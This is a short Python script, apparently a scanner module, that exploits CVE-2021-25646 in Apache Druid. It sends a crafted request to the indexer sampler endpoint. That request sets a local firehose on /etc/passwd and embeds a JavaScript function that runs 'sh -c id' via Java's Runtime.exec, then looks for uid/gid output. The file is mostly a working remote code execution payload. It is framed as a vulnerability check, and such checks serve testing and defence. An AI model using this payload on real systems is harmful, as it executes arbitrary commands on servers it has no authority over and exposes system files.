# -*- coding = utf-8 -*-
# @TIME :  15:07
# @Author : 晓晓鲸鱼
# @File : CVE_2021_25646.py
# @Software : PyCharm
# @脚本说明 : Apache Druid 代码执行漏洞
"""
https://vulhub.org/#/environments/apache-druid/CVE-2021-25646/
Apache Druid 是一种开源分布式数据存储，旨在摄取大量数据，以提供低延迟和高并发的即时数据可见性、即席分析和查询。

Apache Druid 能够执行嵌入在各种类型请求中的用户提供的 JavaScript 代码。
此功能适用于高信任环境，默认情况下处于禁用状态。
然而，在 Druid 0.20.0 及更早版本中，经过身份验证的用户可以发送特制的请求，强制 Druid 为该请求运行用户提供的 JavaScript 代码，无论服务器配置如何。
可以利用 Druid 服务器进程的权限在目标计算机上执行代码。
"""

import requests
import re
import proxy


class CheckVul:

    proxy_mode = ""

    def __init__(self, url, proxy=False):
        self.url = url
        self.proxy_mode = proxy

    def start(self):
        self.__send_req()

    def __send_req(self):

        # 拼接 测试的url
        self.url = self.url.strip("/") + ":8888" + "/druid/indexer/v1/sampler"

        # 发送的POST数据
        data = {
                "type": "index",
                "spec": {
                    "ioConfig": {
                        "type": "index",
                        "firehose": {
                            "type": "local",
                            "baseDir": "/etc",
                            "filter": "passwd"
                        }
                    },
                    "dataSchema": {
                        "dataSource": "test",
                        "parser": {
                            "parseSpec": {
                                "format": "javascript",
                                "timestampSpec": {

                                },
                                "dimensionsSpec": {
                                },
                                "function":"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\"sh\",\"-c\",\"id\"]).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:123123,test: a}}",
                                "":{
                                    "enabled":"true"
                                }
                            }
                        }
                    }
                },
                "samplerConfig": {
                    "numRows": 10
                }
        }

        headers = {
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36",
            "Connection": "close",
            "Cache-Control": "max-age=0",
            "Content-Type": "application/json"
        }

        if self.proxy_mode:
            proxy_obj = proxy.Proxy(self.url, mode="post", data=data, headers=headers)
            resp = proxy_obj.start()
        else:
            resp = requests.post(self.url, data=data, headers=headers)

        # 发送给检测模块
        self.__check(resp)


    def __check(self, resp):

        # 检测是否有执行 id 的回显
        check_rule = r"uid=\d+\(\w+\) gid=\d\(\w+\)"

        re_resp = re.search(check_rule, resp.text)
        if re_resp:
            print("[+]  存在CVE-2021-25646 Apache代码执行漏洞")
        else:
            print("[-]  不存在CVE-2021-25646")








